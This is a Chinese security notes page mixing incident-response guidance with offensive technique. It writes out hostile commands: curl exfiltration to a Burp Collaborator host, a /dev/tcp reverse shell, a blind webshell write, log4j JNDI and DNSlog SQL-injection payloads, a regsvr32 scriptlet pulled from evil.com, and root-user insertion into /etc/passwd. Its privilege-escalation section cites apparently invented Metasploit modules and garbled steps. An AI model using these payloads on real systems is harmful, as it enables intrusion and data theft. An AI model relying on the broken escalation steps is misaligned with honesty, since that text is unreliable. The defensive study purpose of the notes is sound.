<p>Collaborator<br>Client除了dns外也能记录http的请求包，我们可以把命令执行结果写在文件里，通过提交http参数的方式来查看命令执行结果。这种场景适合于没有正向访问路径的情况，如命令执行点不在web目录我们无法通过url直接访问命令执行的结果文件，只能反向提交数据或直接建立反向隧道。</p>
<p>这里我们保存命令执行结果到result.txt，执行以下命令通过Collaborator Client查看文件内容：</p>
<p>curl -X POST -F xx&#x3D;@result.txt<br><a target="_blank" rel="noopener" href="http://ta7jsmzs6ydploiv0z9bpvkd046vuk.burpcollaborator.net/">http://ta7jsmzs6ydploiv0z9bpvkd046vuk.burpcollaborator.net</a><br> <strong>反弹shell</strong></p>
<p>要利用一个命令执行点，最有效的方式便是反弹shell了。反弹shell的方式方法有很多，具体可以参考本公众号的上篇文章</p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&mid=2247483876&idx=1&sn=b71f016be9f345699efcbffdc27b626f&chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&token=1585075487&lang=zh_CN&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkzNjMxNDM0Mg==&amp;mid=2247483876&amp;idx=1&amp;sn=b71f016be9f345699efcbffdc27b626f&amp;chksm=c2a1d56df5d65c7bbee6e1052d0405eab5cb6dbb98bd549459b83b5a2ab6b530cd078ca5398e&amp;token=1585075487&amp;lang=zh_CN&amp;scene=21#wechat_redirect</a></p>
<p>讲隧道的</p>
<p><strong>盲写文件</strong></p>
<p>盲写文件同样适用于不出网的条件下，在全流量不出网时异常好用。我们知道在不出网的条件下建立正向连接是最有效的利用方式，而最稳定的正向连接当属webshell了。在知道web路径的情况下我们可以很方便的通过命令写入webshell，那么我们如何在不知道web路径的条件下盲写webshell呢？</p>
<p>盲写的思路是我们可以在网站访问的相对路径下找一个不常见的flag文件，以这个flag文件为基准利用操作系统的遍历语法在同级目录下写入webshell。</p>
<p>例如我们发现某站点存在一个名为sy-small-<br>banner.png的图片，我们不需要知道该图片的绝对路径就可以通过下面的方式在该图片的同目录下创建一个名为sy-small-<br>banner.png.php的文件。Windows下的盲写行方法：</p>
<p>for &#x2F;r C:\ %i in (sy-small-banner*.png) do @echo “test” &gt; %i.php</p>
<p><img src="/photo/image-20240610002032388.png" alt="image-20240610002032388"></p>
<h2 id="横向移动如何防范"><a href="#横向移动如何防范" class="headerlink" title="横向移动如何防范"></a>横向移动如何防范</h2><p>云主机被getshell了，进行了横向移动，如何进行阻止以及防范？当时回答了两个点：通过<a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=%E9%98%B2%E7%81%AB%E5%A2%99&spm=1001.2101.3001.7020">防火墙</a>出入站策略设置黑名单、EDR设备拦截；</p>
<p><a target="_blank" rel="noopener" href="https://so.csdn.net/so/search?q=EDR&spm=1001.2101.3001.7020">EDR</a>设备监测 (这里以奇安信网神云锁为例)</p>
<p>使用EDR工具收集的数据并训练基于AI的网络安全软件，以留意未经授权的访问及可能存在恶意网络活动的其他异常行为，做公司内网资产管理，主要功能包括：<br>行为管理-服务行为：梳理对外服务进程及其子进程进行的命令执行，文件创建，网络外联行为，用户通过验证行为清单后，可开启告警模式实现服务行为白名单，但出现新增行为时将立即产生告警事件通知用户<br>风险发现-弱口令：很多横向移动的方式都是通过弱口令，已经口令复用(多账号使用同一个口令)进行传递的，EDR可以尝试爆破进行检测是否有弱口令的风险<br>风险发现-历史漏洞：通过集中管理、周期性扫描，从多个维度对目标服务器进行脆弱性扫描和整体评估分析，使用nDay进行模糊测试<br>系统防护-文件监控与防护：对受保护文件违反规则的进行拦截。可以对监控文件进行读取、写入、删除、创建、执行、链接、重命名的操作行为，并记录日志到日志分析<br>全局设置-IP黑白名单：这里通俗易懂就是拉黑ip操作<br><strong>更改系统配置</strong></p>
<p>给系统配置防火墙是防范一般网络攻击的重要手段，对横向移动攻击也能起到一定的作用。比如，通过配置防火墙的进站&#x2F;出站规则阻止445端口的连接，能防范利用SMB协议漏洞的攻击；启用防火墙禁止RDP流量能防止RDP远程连接系统；启动域防火墙能阻止DCOM对象实例化。 此外，我们也可以通过配置Windows系统规则来防范横向移动攻击。当攻击者利用Windows打印机后台处理程序来执行特权操作时，我们可以禁用“允许打印后台处理程序接收客户端连接”，也可以直接禁用打印后台处理程序服务。 当系统遭受NTLM中继攻击时，我们可以禁用NTLM并切换成Kerberos验证，或启用SMB签名和LDAP签名等。（NTLM中继攻击：攻击者劫持受害者会话，将受害者凭证转发到其它服务器获取信任） 正确配置系统规则，不仅能防范横向移动攻击，还能保护系统资源的合法使用。<br><strong>杀软里的一些横向防护功能，如火绒</strong></p>
<h2 id="如果外网服务器被攻破，攻击者已经在内网漫步，该如何处理"><a href="#如果外网服务器被攻破，攻击者已经在内网漫步，该如何处理" class="headerlink" title="如果外网服务器被攻破，攻击者已经在内网漫步，该如何处理"></a>如果外网服务器被攻破，攻击者已经在内网漫步，该如何处理</h2><h3 id="隔离受影响系统"><a href="#隔离受影响系统" class="headerlink" title="隔离受影响系统"></a><strong>隔离受影响系统</strong></h3><ul>
<li><strong>断开网络连接</strong>：立即将受感染的外网服务器和其他受影响的内网设备从网络中断开，以防止攻击者进一步扩散。</li>
<li><strong>关闭受影响系统</strong>：如果无法断开网络连接，可以考虑关闭这些系统，但要在确保数据不会丢失的情况下进行。</li>
</ul>
<p>应急响应的过程</p>
<p>查他从哪打进来的，然后关闭和攻击者相关的非核心业务，审查日志和看本地有没有webshell，c2后门kill掉，注册表 隐藏账号，开机启动项，计划任务，pam文件里，看f值和administrater一样的来查找隐藏用户，</p>
<p><strong>所有用户 History 日志检测</strong></p>
<p>· 关键字：wget&#x2F;curl， gcc， 或者隐藏文件， 敏感文件后缀（.c，.py，conf， .pl， .sh)。</p>
<p>· 检查是否存在异常用户。</p>
<p>· 检查最近添加的用户，是否有不知名用户或不规范提权。</p>
<p>· 找出 root 权限的用户。</p>
<p>可以执行以下命令检查：</p>
<p>grep -v -E “^#” &#x2F;etc&#x2F;passwd | awk -F： ‘$3 &#x3D;&#x3D; 0 { print $1}’</p>
<p><strong>反连木马判断</strong></p>
<p>· netstat –a</p>
<p>· 注意非正常端口的外网 IP</p>
<p><strong>可疑进程判断</strong></p>
<p>· 判断是否为木马 ps –aux</p>
<p>· 重点关注文件（隐藏文件）， Python脚本，Perl脚本，Shell 脚本（bash&#x2F;sh&#x2F;zsh）。</p>
<p>· 使用 which，whereis，find 定位。</p>
<p><strong>Crontab 检测</strong></p>
<p>不要用 crontab –l 查看 crontab（绕过检测），也有通过写 crontab 配置文件反弹Shell 的，笔者接触过几次，一般都是使用的 bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1。</p>
<p><strong>系统日志检测</strong></p>
<p>· 检查 sshd 服务配置文件 &#x2F;etc&#x2F;ssh&#x2F;sshd_config 和系统认证日志 auth、message，判断是否为口令破解攻击。</p>
<p>· &#x2F;etc&#x2F;ssh&#x2F;sshd_config 文件确认认证方式。</p>
<p>· 确认日志是否被删除或者清理过的可能（大小判断）。</p>
<p>· last&#x2F;lastb 可以作为辅助，不过可能不准确。</p>
<p><strong>NHIDS 正常运行判断</strong></p>
<p>· 是否安装：ls &#x2F;etc&#x2F;ossec</p>
<p>· 是否运行正常：ps axu |grep nhids，三个 nhids 进程则表示正常</p>
<p><strong>其他攻击分析</strong></p>
<p>抓取网络数据包并进行分析，判断是否为拒绝服务攻击，这里需要注意，一定要使用 -w 参数，这样才能保存成 pcap 格式导入到 wireshark，这样分析起来会事半功倍。</p>
<p>初步锁定异常进程和恶意代码后，将受影响范围梳理清楚，封禁了入侵者对机器的控制后，接下来需要深入排查入侵原因。一般可以从 Webshell、开放端口服务等方向顺藤摸瓜。</p>
<p><strong>Webshell 入侵</strong></p>
<p>· 使用 Webshell_check.py 脚本检测 Web 目录：</p>
<p>$ python webshell_check.py &#x2F;var&#x2F;www&#x2F; &gt;result.txt</p>
<p>· 查找 Web 目录下所有 nobody 的文件，人工分析：</p>
<p>$ find &#x2F;var&#x2F;www –user nobody &gt;nobody.txt</p>
<p>· 如果能确定入侵时间，可以使用 find 查找最近时间段内变化的文件：</p>
<p>$ find &#x2F; -type f -name “.?*” |xargs ls -l |grep “Mar 22”</p>
<p>$ find &#x2F; -ctime&#x2F;-mtime 8</p>
<p><strong>利用 Web 漏洞直接反连 Shell</strong></p>
<p>分析 access.log：</p>
<p>· 缩小日志范围：时间，异常 IP 提取。</p>
<p>· 攻击行为提取：常见的攻击 exp 识别。</p>
<p><strong>系统弱口令入侵</strong></p>
<p>认证相关日志 auth&#x2F;syslog&#x2F;message 排查：</p>
<p>· 爆破行为定位和 IP 提取。</p>
<p>· 爆破是否成功确定：有爆破行为 IP 是否有 accept 记录。</p>
<p><strong>如果日志已经被清理，使用工具（比如John the Ripper）爆破 &#x2F;etc&#x2F;passwd，&#x2F;etc&#x2F;shadow。</strong></p>
<p><strong>其他入侵</strong></p>
<p>其他服务器跳板到本机。</p>
<p>后续行为分析</p>
<p>· History 日志：提权、增加后门，以及是否被清理。</p>
<p>· Sniffer：网卡混杂模式检测  ifconfig |grep –i proc。</p>
<p>· 内网扫描：网络 nmap&#x2F; 扫描器，socks5 代理。</p>
<p>· 确定是否有 rootkit：rkhunter， chkrootkit， ps&#x2F;netstat 替换确认。</p>
<p><strong>后门清理排查</strong></p>
<p>· 根据时间点做关联分析：查找那个时间段的所有文件。</p>
<p>· 一些小技巧：&#x2F;tmp 目录， ls –la，查看所有文件，注意隐藏的文件。</p>
<p>· 根据用户做时间关联：比如 nobody。</p>
<p>其他机器的关联操作</p>
<p>其他机器和这台机器的网络连接 （日志查看）、相同业务情况（同样业务，负载均衡）。</p>
<h3 id="日志和操作记录全被删了，怎么办？"><a href="#日志和操作记录全被删了，怎么办？" class="headerlink" title="日志和操作记录全被删了，怎么办？"></a>日志和操作记录全被删了，怎么办？</h3><p>strace 查看 losf 进程，再尝试恢复一下日志记录，不行的话镜像硬盘数据慢慢查。这个要用到一些取证工具了，dd 硬盘数据再去还原出来。</p>
<h3 id="系统账号密码都修改了，登不进去？"><a href="#系统账号密码都修改了，登不进去？" class="headerlink" title="系统账号密码都修改了，登不进去？"></a>系统账号密码都修改了，登不进去？</h3><p>重启进单用户模式修改 root 密码，或者通过控制卡操作，或者直接还原系统，都搞不定就直接重装吧。</p>
<p>使用常见的入侵检测命令未发现异常进程，但是机器在对外发包，这是怎么回事？</p>
<p>这种情况下很可能常用的系统命令已经被攻击者或者木马程序替换，可以通过 md5sum 对比本机二进制文件与正常机器的 md5 值是否一致。</p>
<p>如果发现不一致，肯定是被替换了，可以从其他机器上拷贝命令到本机替换，或者 alias 为其他名称，避免为恶意程序再次替换。</p>
<h2 id="如果主机被攻陷该怎么处理"><a href="#如果主机被攻陷该怎么处理" class="headerlink" title="如果主机被攻陷该怎么处理"></a>如果主机被攻陷该怎么处理</h2><p>\1. 立即隔离受影响的系统</p>
<p>1.1 断开网络连接</p>
<p>操作：立即将受影响的主机从网络中断开，避免攻击者进一步访问或传播恶意软件。</p>
<p>目的：限制攻击的扩散，保护其他未受影响的系统。</p>
<p>1.2 停止不必要的服务</p>
<p>操作：关闭非核心的服务和进程，尤其是那些与攻击有关的。</p>
<p>目的：减少攻击面，防止恶意软件通过这些服务进一步传播或造成损害。</p>
<p>\2. 评估攻击情况</p>
<p>2.1 记录攻击迹象</p>
<p>操作：记录所有异常的行为、日志、文件变化等，可能有助于后续分析。</p>
<p>目的：为进一步的调查和修复提供线索。</p>
<p>2.2 确定攻击范围</p>
<p>操作：检查网络流量、系统日志和安全设备警报以确定受影响的范围。</p>
<p>目的：了解攻击的严重性和潜在的影响。</p>
<p>\3. 实施应急措施</p>
<p>3.1 应用安全补丁</p>
<p>操作：如果攻击利用了已知漏洞，应立即应用相应的安全补丁或升级。</p>
<p>目的：阻止攻击者再次利用相同的漏洞。</p>
<p>3.2 运行防病毒&#x2F;恶意软件扫描</p>
<p>操作：使用最新的病毒定义文件进行全面的系统扫描。</p>
<p>目的：识别并清除可能存在的恶意软件。</p>
<p>\4. 恢复系统和数据</p>
<p>4.1 修复受损的系统</p>
<p>操作：根据备份和文档修复受损的系统配置和文件。</p>
<p>目的：确保系统恢复到安全状态。</p>
<p>4.2 恢复数据</p>
<p>操作：从干净的备份中恢复被篡改或丢失的数据。</p>
<p>目的：保证数据的完整性和可用性。</p>
<p>\5. 进行事后分析和强化措施</p>
<p>5.1 安全事件分析</p>
<p>操作：详细分析攻击发生的原因、手段、过程和结果。</p>
<p>目的：学习经验教训，防止未来的攻击。</p>
<p>5.2 加强安全策略</p>
<p>操作：基于分析结果更新安全政策和程序。</p>
<p>目的：提高整体的<a target="_blank" rel="noopener" href="https://www.kdun.com/ask/tag/%E5%AE%89%E5%85%A8%E9%98%B2%E5%BE%A1">安全防御</a>能力。</p>
<p>5.3 增强监控和警报机制</p>
<p>操作：改进入侵检测系统和报警机制。</p>
<p>目的：实时发现并快速响应未来的威胁。</p>
<p>\6. 训练和教育用户</p>
<p>6.1 员工安全意识培训</p>
<p>操作：定期对员工进行网络安全培训。</p>
<p>目的：增强员工对安全威胁的认识，提升安全文化。</p>
<p>但是如果遇到主机被攻破，但要溯源，无法关闭主机怎么办？</p>
<p>禁用network，采用远程VNC，Virtual Network Computing（VNC）是一种远程桌面协议，允许用户通过网络远程访问和控制其他计算机的桌面。在这种情况下，禁用网络后，可以通过局域网或本地连接等非网络通信方式，使用VNC远程连接到受影响的服务器，以进行必要的检查、修复和系统管理操作。</p>
<h2 id="如果上传了之后没有权限怎么办"><a href="#如果上传了之后没有权限怎么办" class="headerlink" title="如果上传了之后没有权限怎么办"></a>如果上传了之后没有权限怎么办</h2><p>通过文件包含攻击进行攻击，php的话可以进行include，jsp的话，不需要这个目录有执行权限，只要解释器有权限就行</p>
<h2 id="webshell如果落地了如何处理"><a href="#webshell如果落地了如何处理" class="headerlink" title="webshell如果落地了如何处理"></a>webshell如果落地了如何处理</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_33295410/article/details/135926984">https://blog.csdn.net/qq_33295410/article/details/135926984</a></p>
<p>确定入侵时间，可通过网站恶意攻击事件事件，webshell文件创建时间，webshell首次被访问时间等线索，判断攻击者实施攻击的时间范围。追踪攻击者IP及攻击途径，从而发现网站漏洞点。</p>
<p>如下图，可以确认该IP地址进行了恶意的目录扫描攻击行为。确认攻击者IP之后，通过筛选日志，确认攻击者攻击途径，重点关注日志中攻击者发起的POST请求内容，尤其是上传功能页面的请求。根据日志中分析的疑似存在漏洞的点位，进行漏洞排查分析。对漏洞进行利用复现，还原攻击者的完整攻击路径。</p>
<p><img src="/photo/image-20240611224246337.png" alt="image-20240611224246337"></p>
<p>或者使用D盾扫描工具自动检测，但是无法针对一些特定的免杀马，</p>
<p>（1）根据上述方法清除发现的Webshell文件，并修复发现的漏洞，避免网站系统再次受到攻击。排查服务器是否存在攻击者遗留的工具或其他后门，例如排查计划任务，启动项，进程等。（详情见 三 其他类型后门处置流程）</p>
<p>（2）检查相关业务系统（RDP、SSH、FTP等）是否存在弱口令账号，确认是否存在账号异常登录情况，修改弱口令，并对非必要对外开放的系统进行远程访问限制。</p>
<p>（3）查看系统补丁信息，根据当前系统补丁情况，确认是否存在未修复的系统漏洞。</p>
<p>（4）检查第三方软件漏洞，如果服务器内有运行对外应用软件（WEB、FTP 等），可通过官方公布的漏洞情况及补丁自查相关软件是否存在漏洞。</p>
<h4 id="3-无文件落地Webshell处置流程"><a href="#3-无文件落地Webshell处置流程" class="headerlink" title="3 无文件落地Webshell处置流程"></a>3 无文件落地Webshell处置流程</h4><p>适用范围：内存马</p>
<h4 id="1-3-1-异常排查"><a href="#1-3-1-异常排查" class="headerlink" title="1.3.1 异常排查"></a>1.3.1 异常排查</h4><p>通过对Web日志文件的分析，确定异常访问的IP。根据异常IP信息对日志进行筛选，进一步分析日志确认攻击者首次攻击时间及攻击行为。</p>
<p><img src="/photo/image-20240611224441583.png" alt="image-20240611224441583"></p>
<p>筛选攻击者访问成功的页面，定位攻击者可能利用的漏洞点位页面。并根据日志中分析的可能存在漏洞的点位，排除网站存在的漏洞，并进行分析。对排查发现的漏洞进行利用复现，还原攻击者攻击路径。</p>
<p>对日志进行分析排查，发现攻击者多次对实际不存在的页面进行了请求，数据包返回大小不同，且服务器返回结果为200，此时将需要考虑服务器是否被植入了内存马，需要对服务进程进行分析。</p>
<h4 id="1-3-2-内存马处置"><a href="#1-3-2-内存马处置" class="headerlink" title="1.3.2 内存马处置"></a>1.3.2 内存马处置</h4><h5 id="1-3-2-1-JAVA内存马查杀"><a href="#1-3-2-1-JAVA内存马查杀" class="headerlink" title="1.3.2.1 JAVA内存马查杀"></a>1.3.2.1 JAVA内存马查杀</h5><h6 id="（1）cop-jar"><a href="#（1）cop-jar" class="headerlink" title="（1）cop.jar"></a>（1）cop.jar</h6><p> 只需要将cop.jar工具放在运行tomcat的服务器上运行cop.jar工具会识别你正在运行的应用列举出来由你自己选择ID，运行后会在同目录下生成.copagent目录储存结果result.txt。</p>
<p><img src="/photo/image-20240611224617043.png" alt="image-20240611224617043"></p>
<p>在java目录下或class文件夹下会保存木马以及运行的类，还原出内存马，可使用D盾进行扫描检查，</p>
<p>（2）arthas-boot.jar</p>
<p>Arthas是一款开源的Java诊断工具，基本使用场景是定位复现一些生产环境比较难以定位问题。可以在线排查问题，以及动态追踪Java代码，实时监控JVM状态等等。输入Mbean 查看或监控 Mbean 的属性信息，根据哥斯拉内存马的特性，进行筛选出异常组件</p>
<p><img src="/photo/image-20240611224712458.png" alt="image-20240611224712458"></p>
<p>（3）java-memshell-scanner</p>
<p>通过jsp脚本扫描并查杀各类中间件内存马。</p>
<p>只需要将tomcat-memshell-scanner.jsp放在可能被注入内存马的web录下，然后使用浏览器访问即可直接获得扫描结果。点击kill即可删除内存马，测试扫描结果可查杀servlet型和filter型。</p>
<h5 id="1-3-2-2-ASPX内存马查杀"><a href="#1-3-2-2-ASPX内存马查杀" class="headerlink" title="1.3.2.2 ASPX内存马查杀"></a>1.3.2.2 ASPX内存马查杀</h5><h6 id="ASP-NET-Memshell-Scanner"><a href="#ASP-NET-Memshell-Scanner" class="headerlink" title="ASP.NET-Memshell-Scanner"></a>ASP.NET-Memshell-Scanner</h6><p>上传aspx-memshell-scanner.aspx到web目录，浏览器访问即可。</p>
<p><img src="/photo/image-20240611224822334.png" alt="image-20240611224822334"></p>
<p>（1）根据上述方法清除发现的内存马，并修复发现的漏洞，避免网站系统再次受到攻击。排查服务器是否存在攻击者遗留的工具或后门，例如排查计划任务，启动项，进程等。（详情见 三 其他类型后门处置流程）</p>
<p>（2）检查相关业务系统（RDP、SSH、FTP等）是否存在弱口令账号，确认是否存在账号异常登录情况，修改弱口令，并对非必要对外开放的系统进行远程访问限制。</p>
<p>（3）查看系统补丁信息，根据当前系统补丁情况，确认是否存在未修复的系统漏洞。</p>
<p>（4）检查第三方软件漏洞，如果服务器内有运行对外应用软件（WEB、FTP 等），可通过官方公布的漏洞情况及补丁自查相关软件是否存在漏洞。</p>
<h2 id="dnslog"><a href="#dnslog" class="headerlink" title="dnslog"></a>dnslog</h2><p>看dns请求包前后时间的包，看一下有没有他请求的结果</p>
<h4 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h4><p>DNSlog经常被用于：数据无回显，命令执行，log4j漏洞检测，CSRF漏洞检测等所有涉及无回显，高隐蔽的攻击。</p>
<h4 id="常用手段"><a href="#常用手段" class="headerlink" title="常用手段"></a>常用手段</h4><p>命令执行无回显通过DNSlog执行命令，将数据带出网络，回显到DNSlog平台</p>
<p><img src="/photo/d3dcbc0fb3812453260908a31022ea30.png" alt="图片"></p>
<p>2.近年的log4j漏洞的检测POC为：${jndi:ldap:&#x2F;&#x2F;ip:port&#x2F;exp}以及一些变种、编码绕过等</p>
<p>3.SQL注入无回显利用</p>
<p>这是一条利用dnslog进行无回显注入</p>
<ol>
<li>?id&#x3D;1’ and if((select load_file(concat(‘\\‘,(攻击代码),’.xxxxxx.ceye.io\abc’))),1,0)–+</li>
</ol>
<h4 id="防御"><a href="#防御" class="headerlink" title="防御"></a>防御</h4><h5 id="（一）事前排查"><a href="#（一）事前排查" class="headerlink" title="（一）事前排查"></a>（一）事前排查</h5><p>如果是Java业务，并且使用了log4j，一是排查是否安装了最新补丁，自查资产。</p>
<p>将业务系统更新到最新系统，并且时刻检测是否有更新包</p>
<h5 id="（二）提前预判，提前阻拦"><a href="#（二）提前预判，提前阻拦" class="headerlink" title="（二）提前预判，提前阻拦"></a>（二）提前预判，提前阻拦</h5><p>通过FOFA、鹰图、钟馗之眼、360资产测绘、Shodan等资产测绘平台，以DNSlog平台为指纹，提前收集DNSlog地址，并且在域控DNS服务器添加正向解析，防止数据被外带。</p>
<p>配置如下</p>
<p>*.dnslog.cn A 127.0.0.1</p>
<p>这样所有DNS数据将被发送到本地，不被外带，留给充足的时间应急响应。</p>
<h5 id="三-事中排查与分析"><a href="#三-事中排查与分析" class="headerlink" title="(三) 事中排查与分析"></a>(三) 事中排查与分析</h5><p>当发现服务器出现DNSlog数据外带的告警，通过以下方式开展排查与分析工作：</p>
<p>Wireshark抓包工具</p>
<p>事后溯源与处置</p>
<p>当发现服务器被植入了DNSlog流量,处置思路如下所示：</p>
<p>一是快速处置：首先隔离受影响的服务器。</p>
<p>二是分析目的地址：通过抓包，过滤出DNSlog的地址，确定为真实流量。</p>
<p>三是溯源分析：根据威胁分析平台中的威胁告警、Web访问流量等，综合判断攻击者通过什么漏洞进行的攻击，还原完整攻击链；</p>
<p>四是应急处置：先通过DNS服务器，重定向DNSlog地址到127.0.0.1，然后进行排查服务器的网络状态、异常文件、异常进程、异常用户、异常启动项、异常计划任务等，清除攻击者留下的后门。</p>
<p>五是修复漏洞：根据溯源分析还原的完整攻击链，制定相关漏洞修复方案，并进行修复。</p>
<p>六是缓解措施：若暂时无法修复漏洞，使用WAF封禁漏洞利用的接口，或通过代理服务器的访问规则屏蔽漏洞利用的接口。</p>
<p>七是业务恢复：处置完毕，业务重新上线。</p>
<h2 id="常见的windows和linux提权方法"><a href="#常见的windows和linux提权方法" class="headerlink" title="常见的windows和linux提权方法"></a>常见的windows和linux提权方法</h2><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_62369433/article/details/130040153">https://blog.csdn.net/weixin_62369433/article/details/130040153</a></p>
<h3 id="常见的Windows提权方法"><a href="#常见的Windows提权方法" class="headerlink" title="常见的Windows提权方法"></a>常见的Windows提权方法</h3><h4 id="利用SeImpersonatePrivilege提权"><a href="#利用SeImpersonatePrivilege提权" class="headerlink" title="利用SeImpersonatePrivilege提权"></a>利用SeImpersonatePrivilege提权</h4><p>执行whoami &#x2F;priv命令，查看当前用户是否拥有SeImpersonatePrivilege权限。</p>
<p>如果拥有该权限，可以使用Impersonate-User脚本提权。该脚本会创建一个新的进程，并使用当前用户的权限执行该进程。</p>
<p>如果没有该权限，可以使用PowerUp脚本，该脚本会检测系统中是否存在可利用的漏洞，并提供相应的利用方法。</p>
<h4 id="利用DLL劫持提权"><a href="#利用DLL劫持提权" class="headerlink" title="利用DLL劫持提权"></a>利用DLL劫持提权</h4><p>找到一个可劫持的DLL文件，如“user32.dll”。</p>
<p>创建一个恶意DLL文件，并将其重命名为“user32.dll”。</p>
<p>将恶意DLL文件放置在系统目录下，等待用户或系统调用“user32.dll”时，恶意DLL文件会被加载，从而可以获得系统权限。</p>
<h5 id="如何判断能否劫持"><a href="#如何判断能否劫持" class="headerlink" title="如何判断能否劫持"></a>如何判断能否劫持</h5><p><em><strong>1）不存在windows系统保护。</strong></em></p>
<p>　　<em><strong>其不在 [HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs] 注册表中。</strong></em></p>
<p>2）其dll是EXE程序首先加载的DLL，而不是依赖其他DLL加载的。（可以通过PE查看器查看）</p>
<p>　　打个比方，比如A.exe加载B.dll，然后B.dll加载C.dll，此时你如果劫持C.dll，生成伪C.dll放在A.exe目录下，其C.dll加载时根据B.dll加载，这样你劫持无效。</p>
<p>3）该DLL确实被加载进内存中</p>
<p>　　通过PE查看器，你发现有被加载的DLL，但当你查看进程内存时却发现并没有该DLL（可能被卸载），如果你想劫持该DLL，可能无效。</p>
<h4 id="利用Token提权"><a href="#利用Token提权" class="headerlink" title="利用Token提权"></a>利用Token提权</h4><p>执行whoami &#x2F;groups命令，查看当前用户所属的组。</p>
<p>利用PsExec工具，执行命令psexec -i -d -s cmd.exe，可以获得一个System权限的命令行窗口。</p>
<p>在命令行窗口中执行whoami &#x2F;groups命令，可以看到当前用户已经拥有System权限的Token。</p>
<h4 id="利用服务提权"><a href="#利用服务提权" class="headerlink" title="利用服务提权"></a>利用服务提权</h4><p>使用sc或net start命令查看当前正在运行的服务。</p>
<p>找到一个可利用的服务，如“Print Spooler”服务。</p>
<p>利用Metasploit框架中的exploit&#x2F;windows&#x2F;local&#x2F;service_permissions模块，可提升该服务的权限，从而获得系统权限。</p>
<h4 id="利用Schtasks提权"><a href="#利用Schtasks提权" class="headerlink" title="利用Schtasks提权"></a>利用Schtasks提权</h4><p>使用schtasks &#x2F;query命令查看当前系统中的计划任务。</p>
<p>找到一个可利用的计划任务，如“System Restore Checkpoint”任务。</p>
<p>利用Metasploit框架中的exploit&#x2F;windows&#x2F;local&#x2F;schtasks模块，可修改该任务的参数，从而获得系统权限。</p>
<h4 id="利用Windows-Installer提权"><a href="#利用Windows-Installer提权" class="headerlink" title="利用Windows Installer提权"></a>利用Windows Installer提权</h4><p>执行msiexec &#x2F;i命令，安装一个恶意的MSI文件。</p>
<p>在安装过程中，会自动创建一个System权限的进程。</p>
<p>利用该进程，可以执行任意的命令，从而获得系统权限。</p>
<h4 id="利用Windows-Subsystem-for-Linux提权"><a href="#利用Windows-Subsystem-for-Linux提权" class="headerlink" title="利用Windows Subsystem for Linux提权"></a>利用Windows Subsystem for Linux提权</h4><p>在Windows系统中安装Windows Subsystem for Linux（WSL）。</p>
<p>在WSL中安装Metasploit框架。</p>
<p>利用Metasploit框架中的exploit&#x2F;linux&#x2F;local&#x2F;sudo模块，可提升当前用户的权限，从而获得系统权限。</p>
<p>利用Windows Management Instrumentation提权<br>执行wmic service list brief命令，查看当前正在运行的服务。</p>
<p>找到一个可利用的服务，如“Winmgmt”服务。</p>
<p>利用Metasploit框架中的exploit&#x2F;windows&#x2F;local&#x2F;wmi模块，可提升该服务的权限，从而获得系统权限。</p>
<h4 id="利用COM提权"><a href="#利用COM提权" class="headerlink" title="利用COM提权"></a>利用COM提权</h4><p>执行regsvr32 &#x2F;s &#x2F;u &#x2F;i:<a target="_blank" rel="noopener" href="https://evil.com/evil.sct">https://evil.com/evil.sct</a> scrobj.dll命令，注入一个恶意的COM脚本。</p>
<p>注入成功后，会自动执行该脚本，并创建一个System权限的进程。</p>
<p>利用该进程，可以执行任意的命令，从而获得系统权限。</p>
<h4 id="利用Kernel提权"><a href="#利用Kernel提权" class="headerlink" title="利用Kernel提权"></a>利用Kernel提权</h4><p>执行systeminfo命令，查看当前系统的信息。</p>
<p>找到一个可利用的漏洞，如CVE-2019-1458漏洞。</p>
<p>利用Metasploit框架中的exploit&#x2F;windows&#x2F;local&#x2F;kernel模块，可利用该漏洞提升当前用户的权限，从而获得系统权限。</p>
<h3 id="常见的Linux提权方法"><a href="#常见的Linux提权方法" class="headerlink" title="常见的Linux提权方法"></a>常见的Linux提权方法</h3><h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>查找具有SUID权限的文件：find &#x2F; -perm -4000 -type f 2&gt;&#x2F;dev&#x2F;null</p>
<p>查看这些文件是否有漏洞：strings &#x2F;usr&#x2F;bin&#x2F;sudo | grep “^”、strings &#x2F;usr&#x2F;bin&#x2F;passwd | grep “^”</p>
<p>找到一个有漏洞的文件，利用漏洞获取root权限</p>
<h4 id="可写的-etc-passwd提权"><a href="#可写的-etc-passwd提权" class="headerlink" title="可写的&#x2F;etc&#x2F;passwd提权"></a>可写的&#x2F;etc&#x2F;passwd提权</h4><p>在&#x2F;etc&#x2F;passwd中添加一个新用户：echo “hacker::0:0:hacker:&#x2F;root:&#x2F;bin&#x2F;bash” &gt;&gt; &#x2F;etc&#x2F;passwd</p>
<p>切换到新用户：su hacker</p>
<p>获取root权限：sudo su</p>
<h4 id="内核提权"><a href="#内核提权" class="headerlink" title="内核提权"></a>内核提权</h4><p>查看内核版本：uname -a</p>
<p>查找内核漏洞：searchsploit Linux Kernel <version> | grep -i “privilege escalation”</p>
<p>找到一个有漏洞的内核，利用漏洞获取root权限</p>
<h4 id="LD-PRELOAD提权"><a href="#LD-PRELOAD提权" class="headerlink" title="LD_PRELOAD提权"></a>LD_PRELOAD提权</h4><p>编写一个恶意的共享库：cat &gt; rootkit.c &lt;&lt; EOF、gcc -shared -o rootkit.so rootkit.c</p>
<p>设置LD_PRELOAD环境变量：export LD_PRELOAD&#x3D;&#x2F;path&#x2F;to&#x2F;rootkit.so</p>
<p>运行一个程序，就能够以root权限运行：sudo &#x2F;usr&#x2F;bin&#x2F;vim</p>
<h4 id="LD-LIBRARY-PATH提权"><a href="#LD-LIBRARY-PATH提权" class="headerlink" title="LD_LIBRARY_PATH提权"></a>LD_LIBRARY_PATH提权</h4><p>编写一个恶意的共享库：cat &gt; rootkit.c &lt;&lt; EOF、gcc -shared -o rootkit.so rootkit.c</p>
<p>设置LD_LIBRARY_PATH环境变量：export LD_LIBRARY_PATH&#x3D;&#x2F;path&#x2F;to&#x2F;rootkit.so</p>
